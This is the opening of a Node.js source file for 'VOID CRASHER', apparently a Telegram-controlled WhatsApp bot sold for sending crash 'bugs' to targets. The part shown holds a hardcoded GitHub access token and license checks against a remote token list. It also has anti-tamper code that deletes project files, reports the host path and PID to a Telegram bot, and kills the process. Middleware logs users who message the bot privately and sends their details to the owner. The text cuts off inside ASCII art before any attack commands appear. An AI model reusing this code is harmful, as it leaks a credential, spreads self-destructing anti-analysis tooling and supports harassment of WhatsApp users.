require("dotenv").config({ path: "./settings/.config" });
const { Telegraf, Markup} = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
} = require("@bellachu/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const tokenBot = process.env.TOKEN_BOT;
const ownerID = process.env.OWNER_ID;
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const OWNER = "razzxyahay"; 
const REPO = "dbsc";
const TOKEN_FILE = "token.json"; 
const GITHUB_TOKEN = "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";

const databaseUrl = `https://raw.githubusercontent.com/razzxyahay/dbsc/refs/heads/main/token.json`;

  const menuEffects = [
  "5046509860389126442",
  "5104841245755180586",
  "5107584321108051014",
  "5159385139981059251"
];

  const thumbnailUrl = "https://files.catbox.moe/dqlwlh.jpg"; // FOTO PAS Kirim Bug
  
  const StartUrl = "https://files.catbox.moe/dqlwlh.jpg"; // FOTO PAS START
  
  const menuUrl = "https://files.catbox.moe/dqlwlh.jpg"; // FOTO MENU
  
  const bugUrl = "https://files.catbox.moe/dqlwlh.jpg"; // FOTO MENU BUG
  
  const toolsUrl = "https://files.catbox.moe/dqlwlh.jpg"; // FOTO TOOLS
  
  const tqtoUrl = "https://files.catbox.moe/dqlwlh.jpg"; // FOTO TQTO
  
  const attackUrl = "https://files.catbox.moe/dqlwlh.jpg"; // FOTO PAS BERES BUG

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function enableBypassProtection() {
  const { env, execArgv } = process;

  function deleteFilesOnCrack() {
    const files = [
      "package.json",
      "Razzxy.js",
      "config.js",
      ".npm",
      "node_modules",
      "settings",
      "VOID CRASHER.zip"
    ];
    for (const file of files) {
      try {
        const targetPath = path.join(process.cwd(), file);
        if (fs.existsSync(targetPath)) {
          fs.unlinkSync(targetPath);
          console.log(`[SECURITY] File dihapus: ${file}`);
        }
      } catch (err) {
        console.error(`[ERROR] Gagal hapus ${file}: ${err.message}`);
      }
    }
  }
  async function reportToTelegram(reason) {
    const text = `🚨 *NGAPAIN KIDS KE DETECTED!*

📂 Path: ${process.cwd()}
🖥️ Node: ${process.version}
PID: ${process.pid}
Reason: ${reason}`;

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: REPORT_CHAT_ID,
        text,
        parse_mode: "Markdown"
      });
      console.log("[REPORT] MAKLO SINI GUA BYPASS YATIM😂");
    } catch (err) {
      console.error("[REPORT] EROR BJIR NGAKAK:", err.message);
    }
  }

  const trueAbort = process.abort;
  const trueExit = process.exit;
  const trueToString = Function.prototype.toString.toString();

  Object.defineProperty(process, "abort", { value: trueAbort, configurable: false, writable: false });
  Object.defineProperty(process, "exit", { value: trueExit, configurable: false, writable: false });

  Object.freeze(Function.prototype);
  Object.freeze(axios.interceptors.request);
  Object.freeze(axios.interceptors.response);

  function onCrackDetected(reason) {
    console.error(`[SECURITY] ${reason}`);
    reportToTelegram(reason);
    deleteFilesOnCrack();
    process.kill(process.pid, "SIGKILL");
  }

  if (Function.prototype.toString.toString() !== trueToString) {
    onCrackDetected("Function.prototype.toString dibajak");
  }

  if (execArgv.length === 0 && process.execArgv !== execArgv) {
    onCrackDetected("process.execArgv dipalsukan");
  }

  ["HTTP_PROXY", "HTTPS_PROXY", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_OPTIONS"].forEach((key) => {
    if (env[key] && env[key] !== "" && env[key] !== "1") {
      onCrackDetected(`ENV ${key} disuntik: ${env[key]}`);
    }
  });

  if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
    onCrackDetected("Interceptor axios terdeteksi");
  }

  try {
    if (typeof module._load === "function") {
      const moduleCode = module._load.toString();
      if (!moduleCode.includes("tryModuleLoad") && !moduleCode.includes("Module._load")) {
        onCrackDetected("Module._load dibajak");
      }
    }
  } catch (err) {
    onCrackDetected("Gagal akses module._load: " + err.message);
  }

  try {
    const trap = Object.getOwnPropertyDescriptor(require.cache, "get");
    if (typeof trap === "function") {
      onCrackDetected("require.cache diproxy");
    }
  } catch {
    onCrackDetected("require.cache error");
  }

  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY razzxy ACTIVE 🔥\n");
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
═―—⊱ ⎧ νσι∂ ¢яαѕнєя ⎭ ⊰―—═⬡
│ Bot Sukses Terhubung Terimakasih
═―———————————————————―—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`⠀⠀⠀⠀⠀⠀
═―—⊱ ⎧ νσι∂ ¢яαѕнєя ⎭ ⊰―—═⬡
│YAHAHA LU SIAPA MPRUY MO PAKE SC GW FREE
│NGOTAK KIDS
═―——————————————————————―—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   MELACAK KEBERADAAN ANDA.        
├───────────────────────────────
│⟢ KING RAZZXY IS BACK
╰─❖──────────────────────────❖─╯
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
═―—⊱ ⎧ νσι∂ ¢яαѕнєя ⎭ ⊰―—═⬡
│ TOKEN TIDAK ADA DI DATABASE 
│ LAWAK NGENTOT
═―————————————―—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.blue(`
═―—⊱ ⎧ νσι∂ ¢яαѕнєя ⎭ ⊰―—═⬡
│ LU SIAPA MPRUY MAU PAKE SC GW
│KETAUAN NIH KANG MALING SCRIPT 
│BELI AKSES SILAHKAN PV @Razzxyubot
═―————————————―—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);

let disabledCmd = fs.existsSync("./database/disabledcmd.json")
  ? JSON.parse(fs.readFileSync("./database/disabledcmd.json"))
  : [];

function isOwner(id) {
  return id.toString() === ownerID.toString();
}

function saveCmd(data) {
  fs.writeFileSync("./database/disabledcmd.json", JSON.stringify(data, null, 2));
}

bot.use((ctx, next) => {
  if (!ctx.message?.text) return next();

  const cmd = ctx.message.text.split(" ")[0].replace("/", "");

  if (disabledCmd.includes(cmd) && !isOwner(ctx.from.id)) {
    return ctx.reply(`❌ Command /${cmd} sedang dinonaktifkan.`);
  }

  return next();
});

let tokenValidated = false;

bot.use((ctx, next) => {
  return next(); // LANGSUNG LEWAT, TANPA CEK TOKEN
});

// ============ NOTIF BOT DIMASUKIN KE GROUP + LINK ============
bot.on("new_chat_members", async (ctx) => {
  const newMembers = ctx.message.new_chat_members;
  const botId = ctx.botInfo.id;
  
  // CEK APAKAH BOT YANG DIMASUKIN
  const isBotAdded = newMembers.some(member => member.id === botId);
  
  if (isBotAdded) {
    const groupId = ctx.chat.id;
    const groupTitle = ctx.chat.title || "Tidak ada nama";
    const inviter = ctx.message.from;
    const inviterName = inviter.username ? `@${inviter.username}` : inviter.first_name;
    const inviterId = inviter.id;
    const waktu = new Date().toLocaleString();
    
    // COBA AMBIL LINK GROUP (HANYA BISA JIKA BOT ADMIN)
    let groupLink = "Tidak bisa diambil (bot bukan admin)";
    try {
      const inviteLink = await ctx.telegram.exportChatInviteLink(groupId);
      if (inviteLink) {
        groupLink = inviteLink;
      }
    } catch (error) {
      // BOT BUKAN ADMIN ATAU GAGAL AMBIL LINK
      groupLink = "❌ Bot bukan admin, tidak bisa ambil link";
    }
    
    // KIRIM NOTIF KE OWNER
    await ctx.telegram.sendMessage(ownerId, `
✅ *BOT DITAMBAHKAN KE GROUP*

👥 *Group Info:*
├ 📛 Nama: ${groupTitle}
├ 🆔 ID: \`${groupId}\`
└ 🔗 Link: ${groupLink}

👤 *Ditambahkan oleh:*
├ 👤 Nama: ${inviterName}
├ 🆔 ID: \`${inviterId}\`
└ 📛 Username: ${inviter.username ? `@${inviter.username}` : "Tidak ada"}

⏰ Waktu: ${waktu}

ℹ️ Bot siap digunakan di group ini.
    `, { parse_mode: "Markdown" });
    
    // BALAS KE GROUP (OPSIONAL)
    try {
      await ctx.reply(`
😹 NGAPAIN LU YATIM
      `, { parse_mode: "Markdown" });
    } catch (e) {}
  }
});
// ============ ANTI PM + LOG KE OWNER DENGAN TOMBOL ============
const ownerId = ownerID;

// PESAN OTOMATIS KE USER
const autoReplyMessage = `😹 NGGAK BISA YA TOLOL`;

// MIDDLEWARE CEK PM
bot.use(async (ctx, next) => {
  const userId = ctx.from.id;
  const chatType = ctx.chat.type;
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const fullName = ctx.from.first_name || "Tidak ada nama";
  
  // LEWATIN KALAU OWNER
  if (userId == ownerId) {
    return next();
  }
  
  // CEK PRIVATE CHAT
  if (chatType === "private") {
    // KIRIM NOTIF KE OWNER (TANPA TOMBOL)
    await ctx.telegram.sendMessage(
  ownerId,
  `
🚨 ADA HAMA NIH KONTOL YANG MAU PM BOT LU DI PV🚨

👤 Nama: ${fullName}
🆔 User ID: ${userId}
📛 Username: ${username}
💬 Pesan: ${ctx.message?.text || "Tidak ada pesan"}
⏰ Waktu: ${new Date().toLocaleString()}

⚠️ Orang ini mencoba menggunakan bot di Private Chat!
`
)
    
    // BALAS OTOMATIS KE USER
    return ctx.reply(autoReplyMessage, { parse_mode: "Markdown" });
  }
  
  return next();
});

// ============ WAJIB JOIN CHANNEL (BACA LINK DARI .env) ============
// ============ WAJIB JOIN CHANNEL (BACA LINK DARI .env) ============
const REQUIRED_CHANNEL_LINK = process.env.REQUIRED_CHANNEL_LINK;

// AMBIL USERNAME DARI LINK
const channelUsername = REQUIRED_CHANNEL_LINK?.match(/t\.me\/([a-zA-Z0-9_]+)/)?.[1] || null;

// FUNGSI CEK JOIN CHANNEL
async function isUserJoinedChannel(userId) {
  try {
    if (!channelUsername) return false;
    const chatMember = await bot.telegram.getChatMember(`@${channelUsername}`, userId);
    const status = chatMember.status;
    const joinedStatus = ["member", "administrator", "creator"];
    return joinedStatus.includes(status);
  } catch (error) {
    return false;
  }
}

// MIDDLEWARE CEK JOIN CHANNEL
const checkJoinChannel = async (ctx, next) => {
  const userId = ctx.from.id;
  
  // LEWATIN KALAU OWNER
  if (userId == ownerID) {
    return next();
  }
  
  const isJoined = await isUserJoinedChannel(userId);
  
  if (!isJoined) {
    return ctx.reply(`
<pre>❌ AKSES DITOLAK!

𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗘𝗧𝗠𝗜𝗡 𝗗𝗨𝗟𝗨</pre>
    `, {
      parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
       [
         { text: "🔗 JOIN CHANNEL", url: REQUIRED_CHANNEL_LINK , style: "Danger" },
         { text: "✅ SUDAH JOIN", callback_data: "check_join", style: "Success" }
        ]
       ]
      }
    });
  }
  
  next();
};

// HANDLER TOMBOL "SUDAH JOIN"
bot.action("check_join", async (ctx) => {
  const userId = ctx.from.id;
  const isJoined = await isUserJoinedChannel(userId);
  
  if (isJoined) {
    await ctx.answerCbQuery("✅ 𝗔𝗡𝗝𝗔𝗬𝗬 𝗟𝗨 𝗨𝗗𝗔𝗛 𝗕𝗜𝗦𝗔 𝗣𝗔𝗞𝗘 𝗪𝗢𝗞");
    await ctx.editMessageText("✅ 𝗔𝗡𝗝𝗔𝗬𝗬 𝗟𝗨 𝗨𝗗𝗔𝗛 𝗕𝗜𝗦𝗔 𝗣𝗔𝗞𝗘 𝗪𝗢𝗞", { parse_mode: "HTML" });
  } else {
    await ctx.answerCbQuery("❌ Anda belum join channel!", { show_alert: true });
  }
});

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const GROUP_ALLOW_FILE = path.join(__dirname, "database", "group.json");

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 0
    } catch {
        return 0
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.red(`
  
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));

  console.log(chalk.yellow(`
━─━━⪻「 νσι∂ ¢яαѕнєя 」⪼━━─━
┏───────────────────┓
│╭━( INFORMASI )
┃女 Developer :@Razzxyubot
┃女 channell : @VoidCrasherTeam
┗───────────────────┛
`));
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Always Prime',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote> ⬡═―—⊱ ⎧ νσι∂ ¢яαѕнєя ⎭ ⊰―—═⬡
𖤓 Number: ${lastPairingMessage.phoneNumber}
𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
𖤓 Status: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
